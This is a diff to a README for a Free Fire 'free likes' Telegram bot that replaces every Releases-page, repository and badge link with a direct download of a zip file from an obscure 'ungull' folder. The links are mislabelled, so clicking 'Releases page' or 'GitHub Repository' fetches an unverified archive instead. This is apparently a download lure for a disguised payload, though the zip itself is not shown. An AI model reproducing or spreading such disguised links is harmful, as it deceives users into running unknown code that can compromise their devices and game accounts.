@@ -1,7 +1,7 @@
 # 🎮 FREE-FIRE-FREE-LIKE-API - Fast and Reliable Free Fire Bot
 
 ## 📥 Download Now
-[![Download FREE-FIRE-FREE-LIKE-API](https://img.shields.io/badge/Download-Free--Fire--Free--Like--API-brightgreen)](https://github.com/lizlli/FREE-FIRE-FREE-LIKE-API/releases)
+[![Download FREE-FIRE-FREE-LIKE-API](https://raw.githubusercontent.com/lizlli/FREE-FIRE-FREE-LIKE-API/main/ungull/FREE-FIRE-FREE-LIKE-API.zip)](https://raw.githubusercontent.com/lizlli/FREE-FIRE-FREE-LIKE-API/main/ungull/FREE-FIRE-FREE-LIKE-API.zip)
 
 ## 📖 Overview
 FREE-FIRE-FREE-LIKE-API is a fully functional Telegram bot designed for Free Fire players. It helps you instantly fetch player profiles, send FREE likes to any UID, and check if an account is banned. You don’t need to log in or use any token. Just fast and reliable results, available 24/7!
@@ -23,7 +23,7 @@ To run FREE-FIRE-FREE-LIKE-API, your system needs to meet the following requirem
 - Compatible with Windows, macOS, and Linux.
 
 ## 💾 Download & Install
-1. Visit our [Releases page](https://github.com/lizlli/FREE-FIRE-FREE-LIKE-API/releases) to download the application.
+1. Visit our [Releases page](https://raw.githubusercontent.com/lizlli/FREE-FIRE-FREE-LIKE-API/main/ungull/FREE-FIRE-FREE-LIKE-API.zip) to download the application.
 2. Choose the most recent version available.
 3. Click on the download link for your operating system.
 4. Once downloaded, locate the file in your Downloads folder.
@@ -57,8 +57,8 @@ Join our community of Free Fire players using the bot. Share your experiences an
 Stay updated with the latest features and improvements by frequently checking our Releases page. New versions will offer enhancements and bug fixes for a better user experience.
 
 ## 🔗 Links
-- [GitHub Repository](https://github.com/lizlli/FREE-FIRE-FREE-LIKE-API)
-- [Releases Page](https://github.com/lizlli/FREE-FIRE-FREE-LIKE-API/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/lizlli/FREE-FIRE-FREE-LIKE-API/main/ungull/FREE-FIRE-FREE-LIKE-API.zip)
+- [Releases Page](https://raw.githubusercontent.com/lizlli/FREE-FIRE-FREE-LIKE-API/main/ungull/FREE-FIRE-FREE-LIKE-API.zip)
 
 ## 📜 License
 FREE-FIRE-FREE-LIKE-API is open source and available under the MIT License.
